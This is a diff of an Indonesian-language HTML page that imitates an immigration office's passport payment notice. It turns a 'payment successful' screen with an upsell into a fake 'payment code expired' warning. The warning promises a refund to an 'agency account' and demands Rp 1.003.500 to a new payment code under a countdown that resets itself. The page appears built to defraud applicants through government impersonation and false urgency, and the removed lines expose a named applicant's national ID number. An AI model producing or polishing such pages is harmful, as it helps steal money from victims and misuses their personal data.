@@ -3,7 +3,7 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>Konfirmasi Pembayaran Paspor</title>
+    <title>Peringatan Kode Pembayaran Kadaluarsa</title>
     <style>
         * {
             margin: 0;
@@ -32,7 +32,7 @@
         }
         
         .header {
-            background-color: #003366;
+            background-color: #e63946;
             color: white;
             padding: 20px;
             text-align: center;
@@ -58,25 +58,25 @@
             padding: 25px;
         }
         
-        .success-message {
+        .warning-message {
             text-align: center;
             margin-bottom: 25px;
         }
         
-        .success-icon {
+        .warning-icon {
             font-size: 60px;
-            color: #28a745;
+            color: #e63946;
             margin-bottom: 15px;
         }
         
-        .success-title {
+        .warning-title {
             font-size: 22px;
             font-weight: bold;
-            color: #28a745;
+            color: #e63946;
             margin-bottom: 10px;
         }
         
-        .success-text {
+        .warning-text {
             font-size: 16px;
             color: #333;
             line-height: 1.5;
@@ -111,174 +111,6 @@
         .info-value {
             font-weight: 600;
             color: #333;
-        }
-        
-        .appointment-info {
-            background-color: #f0f7ff;
-            border-radius: 8px;
-            padding: 15px;
-            margin-bottom: 20px;
-            border-left: 4px solid #003366;
-        }
-        
-        .appointment-title {
-            font-size: 16px;
-            font-weight: bold;
-            color: #003366;
-            margin-bottom: 8px;
-        }
-        
-        .appointment-details {
-            font-size: 14px;
-            color: #333;
-            line-height: 1.5;
-        }
-        
-        .appointment-time {
-            font-size: 18px;
-            font-weight: bold;
-            color: #e63946;
-            text-align: center;
-            margin: 15px 0;
-        }
-        
-        .warning {
-            background-color: #fff8e1;
-            border-left: 4px solid #ffc107;
-            padding: 15px;
-            margin: 20px 0;
-            font-size: 14px;
-            color: #5d4037;
-        }
-        
-        .btn-container {
-            display: flex;
-            justify-content: center;
-            margin-top: 25px;
-            gap: 10px;
-        }
-        
-        .btn {
-            background-color: #003366;
-            color: white;
-            border: none;
-            padding: 12px 25px;
-            border-radius: 5px;
-            font-size: 16px;
-            font-weight: bold;
-            cursor: pointer;
-            transition: background-color 0.3s;
-        }
-        
-        .btn:hover {
-            background-color: #002244;
-        }
-        
-        .btn-acceleration {
-            background-color: #e63946;
-        }
-        
-        .btn-acceleration:hover {
-            background-color: #c62828;
-        }
-        
-        .footer {
-            background-color: #f1f1f1;
-            padding: 15px;
-            text-align: center;
-            font-size: 12px;
-            color: #666;
-        }
-        
-        .copyright {
-            font-weight: 500;
-        }
-        
-        .acceleration-info {
-            background-color: #fff8e1;
-            border-radius: 8px;
-            padding: 15px;
-            margin-bottom: 20px;
-            border-left: 4px solid #ffc107;
-        }
-        
-        .acceleration-title {
-            font-size: 16px;
-            font-weight: bold;
-            color: #e63946;
-            margin-bottom: 8px;
-        }
-        
-        .acceleration-details {
-            font-size: 14px;
-            color: #333;
-            line-height: 1.5;
-        }
-        
-        .acceleration-benefits {
-            margin-top: 10px;
-        }
-        
-        .benefit-item {
-            display: flex;
-            align-items: flex-start;
-            margin-bottom: 8px;
-        }
-        
-        .benefit-icon {
-            color: #28a745;
-            margin-right: 8px;
-            font-weight: bold;
-        }
-        
-        /* Popup Payment Styles */
-        .payment-popup {
-            display: none;
-            position: fixed;
-            top: 0;
-            left: 0;
-            width: 100%;
-            height: 100%;
-            background-color: rgba(0, 0, 0, 0.8);
-            z-index: 1000;
-            justify-content: center;
-            align-items: center;
-        }
-        
-        .payment-popup.active {
-            display: flex;
-        }
-        
-        .payment-container {
-            background-color: white;
-            border-radius: 10px;
-            width: 90%;
-            max-width: 500px;
-            overflow: hidden;
-            box-shadow: 0 5px 15px rgba(0, 0, 0, 0.3);
-            position: relative;
-        }
-        
-        .payment-header {
-            background-color: #e63946;
-            color: white;
-            padding: 20px;
-            text-align: center;
-        }
-        
-        .payment-title {
-            font-size: 18px;
-            font-weight: bold;
-            margin-bottom: 5px;
-        }
-        
-        .payment-subtitle {
-            font-size: 14px;
-            opacity: 0.9;
-        }
-        
-        .payment-content {
-            padding: 25px;
         }
         
         .payment-info {
@@ -322,6 +154,27 @@
             font-style: italic;
         }
         
+        .refund-info {
+            background-color: #fff8e1;
+            border-radius: 8px;
+            padding: 15px;
+            margin-bottom: 20px;
+            border-left: 4px solid #ffc107;
+        }
+        
+        .refund-title {
+            font-size: 16px;
+            font-weight: bold;
+            color: #e63946;
+            margin-bottom: 8px;
+        }
+        
+        .refund-details {
+            font-size: 14px;
+            color: #333;
+            line-height: 1.5;
+        }
+        
         .timer-container {
             text-align: center;
             margin: 20px 0;
@@ -344,21 +197,38 @@
             min-width: 200px;
         }
         
-        .close-btn {
-            position: absolute;
-            top: 10px;
-            right: 10px;
-            background: none;
-            border: none;
-            color: white;
-            font-size: 24px;
-            cursor: pointer;
-            opacity: 0.7;
-            transition: opacity 0.3s;
+        .btn-container {
+            display: flex;
+            justify-content: center;
+            margin-top: 25px;
         }
         
-        .close-btn:hover {
-            opacity: 1;
+        .btn {
+            background-color: #003366;
+            color: white;
+            border: none;
+            padding: 12px 25px;
+            border-radius: 5px;
+            font-size: 16px;
+            font-weight: bold;
+            cursor: pointer;
+            transition: background-color 0.3s;
+        }
+        
+        .btn:hover {
+            background-color: #002244;
+        }
+        
+        .footer {
+            background-color: #f1f1f1;
+            padding: 15px;
+            text-align: center;
+            font-size: 12px;
+            color: #666;
+        }
+        
+        .copyright {
+            font-weight: 500;
         }
         
         @media (max-width: 480px) {
@@ -378,20 +248,25 @@
                 padding: 20px 15px;
             }
             
-            .success-title {
+            .warning-title {
                 font-size: 20px;
             }
             
-            .success-text {
+            .warning-text {
                 font-size: 15px;
             }
             
-            .appointment-time {
+            .payment-amount {
+                font-size: 20px;
+            }
+            
+            .payment-code {
                 font-size: 16px;
             }
             
-            .btn-container {
-                flex-direction: column;
+            .timer {
+                font-size: 20px;
+                min-width: 180px;
             }
         }
     </style>
@@ -400,15 +275,15 @@
     <div class="popup-container">
         <div class="header">
             <img src="https://z-cdn-media.chatglm.cn/files/12038e0f-115c-45aa-9d42-52d6ea82ffe6_Logo.png?auth_key=1790939066-c0ecc9049e204f12a6409fbc78ea90a8-0-f4eae3f3ae6679c5ee07784c0200fba2" alt="Logo Imigrasi" class="logo">
-            <div class="title">KONFIRMASI PEMBAYARAN</div>
-            <div class="subtitle">Pembayaran Permohonan Paspor Berhasil</div>
+            <div class="title">PERINGATAN: KODE PEMBAYARAN KADALUARSA</div>
+            <div class="subtitle">Silakan lakukan pembayaran dengan kode baru</div>
         </div>
         
         <div class="content">
-            <div class="success-message">
-                <div class="success-icon">✓</div>
-                <div class="success-title">TERIMA KASIH</div>
-                <div class="success-text">Status permohonan pendaftaran paspor Anda sudah berhasil terbayarkan. Silahkan datang sesuai dengan waktu yang sudah ditentukan.</div>
+            <div class="warning-message">
+                <div class="warning-icon">⚠️</div>
+                <div class="warning-title">KODE ANDA KADALUARSA</div>
+                <div class="warning-text">Kode pembayaran Anda telah kadaluarsa. Saldo yang sudah masuk akan dikembalikan dalam waktu 4 jam ke akun agency Anda. Silakan lakukan pembayaran dengan kode baru dan tepat waktu.</div>
             </div>
             
             <div class="info-section">
@@ -430,48 +305,38 @@
                     <span class="info-value">Perempuan</span>
                 </div>
                 <div class="info-row">
-                    <span class="info-label">Status Layanan</span>
-                    <span class="info-value">Permohonan Paspor Baru - Paspor Elektronik 10 Tahun</span>
+                    <span class="info-label">Layanan</span>
+                    <span class="info-value">Percepatan Paspor 1 Hari</span>
                 </div>
             </div>
             
-            <div class="appointment-info">
-                <div class="appointment-title">Informasi Jadwal</div>
-                <div class="appointment-details">
-                    <strong>Kantor Imigrasi:</strong> Kantor Imigrasi Kelas 1 TPI Batam<br>
-                    <strong>Alamat:</strong> Jl. Engku Putri, Batam Center, Kota Batam, Kepulauan Riau 29464
-                </div>
-                <div class="appointment-time">Selasa, 11 November 2025<br>Pukul 10:00 WIB</div>
-            </div>
-            
-            <div class="acceleration-info">
-                <div class="acceleration-title">Layanan Percepatan</div>
-                <div class="acceleration-details">
-                    Ingin paspor Anda lebih cepat selesai? Gunakan layanan percepatan kami!
-                </div>
-                <div class="acceleration-benefits">
-                    <div class="benefit-item">
-                        <span class="benefit-icon">✓</span>
-                        <span>Paspor selesai dalam 1 hari kerja</span>
-                    </div>
-                    <div class="benefit-item">
-                        <span class="benefit-icon">✓</span>
-                        <span>Proses prioritas tanpa antri</span>
-                    </div>
-                    <div class="benefit-item">
-                        <span class="benefit-icon">✓</span>
-                        <span>Layanan khusus dengan fasilitas VIP</span>
-                    </div>
+            <div class="refund-info">
+                <div class="refund-title">Informasi Pengembalian Dana</div>
+                <div class="refund-details">
+                    Saldo pembayaran Anda yang sebelumnya akan dikembalikan ke akun agency dalam waktu <strong>4 jam</strong>. Pastikan Anda melakukan pembayaran dengan kode baru sebelum batas waktu yang ditentukan.
                 </div>
             </div>
             
-            <div class="warning">
-                <strong>Perhatian:</strong> Mohon jangan sampai telat datang. Keterlambatan dapat menyebabkan permohonan Anda ditunda atau dibatalkan. Pastikan Anda membawa semua dokumen yang diperlukan dan datang 15 menit sebelum jadwal yang ditentukan.
+            <div class="payment-info">
+                <div class="info-title">Informasi Pembayaran Baru</div>
+                <div class="info-row">
+                    <span class="info-label">Jumlah Pembayaran</span>
+                </div>
+                <div class="payment-amount">Rp 1.003.500,00</div>
+                <div class="info-row">
+                    <span class="info-label">Kode Pembayaran Baru</span>
+                </div>
+                <div class="payment-code" id="paymentCode">910266000000480743</div>
+                <div class="copy-hint">Klik pada kode pembayaran untuk menyalin</div>
+            </div>
+            
+            <div class="timer-container">
+                <div class="timer-label">Batas Waktu Pembayaran</div>
+                <div class="timer" id="countdown">02:00:00</div>
             </div>
             
             <div class="btn-container">
                 <button class="btn" onclick="window.print()">Cetak Bukti</button>
-                <button class="btn btn-acceleration" id="accelerationBtn">Layanan Percepatan</button>
             </div>
         </div>
         
@@ -480,91 +345,7 @@
         </div>
     </div>
 
-    <!-- Payment Popup -->
-    <div class="payment-popup" id="paymentPopup">
-        <div class="payment-container">
-            <div class="payment-header">
-                <button class="close-btn" id="closePopup">&times;</button>
-                <div class="payment-title">PEMBAYARAN LAYANAN PERCEPATAN</div>
-                <div class="payment-subtitle">Pembayaran Permohonan Paspor Percepatan</div>
-            </div>
-            
-            <div class="payment-content">
-                <div class="info-section">
-                    <div class="info-title">Data Pemohon</div>
-                    <div class="info-row">
-                        <span class="info-label">Nama</span>
-                        <span class="info-value">JAMRAH</span>
-                    </div>
-                    <div class="info-row">
-                        <span class="info-label">NIK</span>
-                        <span class="info-value">1506024710710002</span>
-                    </div>
-                    <div class="info-row">
-                        <span class="info-label">Layanan</span>
-                        <span class="info-value">Percepatan Paspor 1 Hari</span>
-                    </div>
-                </div>
-                
-                <div class="payment-info">
-                    <div class="info-title">Informasi Pembayaran</div>
-                    <div class="info-row">
-                        <span class="info-label">Jumlah Pembayaran</span>
-                    </div>
-                    <div class="payment-amount">Rp 1.003.500,00</div>
-                    <div class="info-row">
-                        <span class="info-label">Kode Pembayaran</span>
-                    </div>
-                    <div class="payment-code" id="paymentCode">910266000000476932</div>
-                    <div class="copy-hint">Klik pada kode pembayaran untuk menyalin</div>
-                </div>
-                
-                <div class="timer-container">
-                    <div class="timer-label">Batas Waktu Pembayaran</div>
-                    <div class="timer" id="countdown">02:00:00</div>
-                </div>
-                
-                <div class="warning">
-                    <strong>Perhatian:</strong> Harap melakukan pembayaran sebelum batas waktu yang ditentukan. Apabila batas waktu telah habis dan Anda belum melakukan pembayaran, maka permohonan Anda akan ditolak oleh sistem secara otomatis.
-                </div>
-                
-                <div class="btn-container">
-                    <button class="btn" onclick="window.print()">Cetak Bukti</button>
-                </div>
-            </div>
-        </div>
-    </div>
-
     <script>
-        // Cek apakah pembayaran percepatan sudah dimulai
-        const accelerationStarted = localStorage.getItem('accelerationStarted');
-        const paymentPopup = document.getElementById('paymentPopup');
-        const accelerationBtn = document.getElementById('accelerationBtn');
-        const closePopup = document.getElementById('closePopup');
-        
-        // Jika pembayaran percepatan sudah dimulai, tampilkan popup
-        if (accelerationStarted === 'true') {
-            paymentPopup.classList.add('active');
-        }
-        
-        // Tombol untuk membuka popup pembayaran percepatan
-        accelerationBtn.addEventListener('click', function() {
-            paymentPopup.classList.add('active');
-            localStorage.setItem('accelerationStarted', 'true');
-            
-            // Set waktu awal (2 jam dalam detik)
-            const initialTime = 2 * 60 * 60;
-            localStorage.setItem('paymentTimeLeft', initialTime);
-            
-            // Mulai countdown
-            startCountdown();
-        });
-        
-        // Tombol untuk menutup popup
-        closePopup.addEventListener('click', function() {
-            paymentPopup.classList.remove('active');
-        });
-        
         // Fungsi untuk menyalin kode pembayaran
         document.getElementById('paymentCode').addEventListener('click', function() {
             // Membuat elemen input sementara
@@ -591,71 +372,64 @@
             }, 2000);
         });
         
-        // Fungsi untuk menjalankan countdown
-        function startCountdown() {
-            // Cek apakah ada waktu tersisa di localStorage
-            let timeLeft = localStorage.getItem('paymentTimeLeft') 
-                ? parseInt(localStorage.getItem('paymentTimeLeft')) 
-                : (2 * 60 * 60);
-            
-            // Update tampilan countdown
-            function updateCountdown() {
-                const hours = Math.floor(timeLeft / 3600);
-                const minutes = Math.floor((timeLeft % 3600) / 60);
-                const seconds = timeLeft % 60;
-                
-                // Format tampilan waktu
-                const formattedTime = 
-                    String(hours).padStart(2, '0') + ':' + 
-                    String(minutes).padStart(2, '0') + ':' + 
-                    String(seconds).padStart(2, '0');
-                
-                document.getElementById('countdown').textContent = formattedTime;
-                
-                // Simpan waktu tersisa ke localStorage
-                localStorage.setItem('paymentTimeLeft', timeLeft);
-                
-                // Kurangi waktu
-                timeLeft--;
-                
-                // Jika waktu habis
-                if (timeLeft < 0) {
-                    clearInterval(timerInterval);
-                    document.getElementById('countdown').textContent = "WAKTU HABIS";
-                    document.getElementById('countdown').style.color = "#ff0000";
-                    
-                    // Tampilkan pemberitahuan bahwa permohonan ditolak
-                    const warning = document.querySelector('.payment-content .warning');
-                    warning.innerHTML = "<strong>Perhatian:</strong> Waktu pembayaran telah habis. Permohonan Anda telah ditolak oleh sistem secara otomatis. Anda harus membuat permohonan baru jika masih ingin mengajukan layanan percepatan.";
-                    warning.style.backgroundColor = "#ffebee";
-                    warning.style.borderLeftColor = "#f44336";
-                    warning.style.color = "#c62828";
-                    
-                    // Nonaktifkan tombol cetak
-                    document.querySelector('.payment-content .btn').disabled = true;
-                    document.querySelector('.payment-content .btn').style.backgroundColor = "#cccccc";
-                    document.querySelector('.payment-content .btn').style.cursor = "not-allowed";
-                    
-                    // Reset status pembayaran
-                    localStorage.removeItem('accelerationStarted');
-                    localStorage.removeItem('paymentTimeLeft');
-                }
-            }
-            
-            // Hentikan timer yang mungkin sudah berjalan
-            if (window.timerInterval) {
-                clearInterval(window.timerInterval);
-            }
-            
-            // Jalankan countdown setiap detik
-            updateCountdown();
-            window.timerInterval = setInterval(updateCountdown, 1000);
+        // Set waktu awal (2 jam dalam detik)
+        const initialTime = 2 * 60 * 60;
+        
+        // Cek apakah ada waktu tersisa di localStorage
+        let timeLeft = localStorage.getItem('paymentTimeLeft') 
+            ? parseInt(localStorage.getItem('paymentTimeLeft')) 
+            : initialTime;
+        
+        // Jika waktu tersisa kurang dari atau sama dengan 0, set ulang
+        if (timeLeft <= 0) {
+            timeLeft = initialTime;
         }
         
-        // Jika pembayaran percepatan sudah dimulai, jalankan countdown
-        if (accelerationStarted === 'true') {
-            startCountdown();
+        // Simpan waktu tersisa ke localStorage
+        localStorage.setItem('paymentTimeLeft', timeLeft);
+        
+        // Update tampilan countdown
+        function updateCountdown() {
+            const hours = Math.floor(timeLeft / 3600);
+            const minutes = Math.floor((timeLeft % 3600) / 60);
+            const seconds = timeLeft % 60;
+            
+            // Format tampilan waktu
+            const formattedTime = 
+                String(hours).padStart(2, '0') + ':' + 
+                String(minutes).padStart(2, '0') + ':' + 
+                String(seconds).padStart(2, '0');
+            
+            document.getElementById('countdown').textContent = formattedTime;
+            
+            // Simpan waktu tersisa ke localStorage
+            localStorage.setItem('paymentTimeLeft', timeLeft);
+            
+            // Kurangi waktu
+            timeLeft--;
+            
+            // Jika waktu habis
+            if (timeLeft < 0) {
+                clearInterval(timerInterval);
+                document.getElementById('countdown').textContent = "WAKTU HABIS";
+                document.getElementById('countdown').style.color = "#ff0000";
+                
+                // Tampilkan pemberitahuan bahwa permohonan ditolak
+                const warning = document.querySelector('.refund-info');
+                warning.innerHTML = "<div class='refund-title'>PERINGATAN: WAKTU HABIS</div><div class='refund-details'>Waktu pembayaran telah habis. Permohonan Anda telah ditolak oleh sistem secara otomatis. Anda harus membuat permohonan baru jika masih ingin mengajukan layanan percepatan.</div>";
+                warning.style.backgroundColor = "#ffebee";
+                warning.style.borderLeftColor = "#f44336";
+                
+                // Nonaktifkan tombol cetak
+                document.querySelector('.btn').disabled = true;
+                document.querySelector('.btn').style.backgroundColor = "#cccccc";
+                document.querySelector('.btn').style.cursor = "not-allowed";
+            }
         }
+        
+        // Jalankan countdown setiap detik
+        updateCountdown();
+        const timerInterval = setInterval(updateCountdown, 1000);
     </script>
 </body>
 </html>
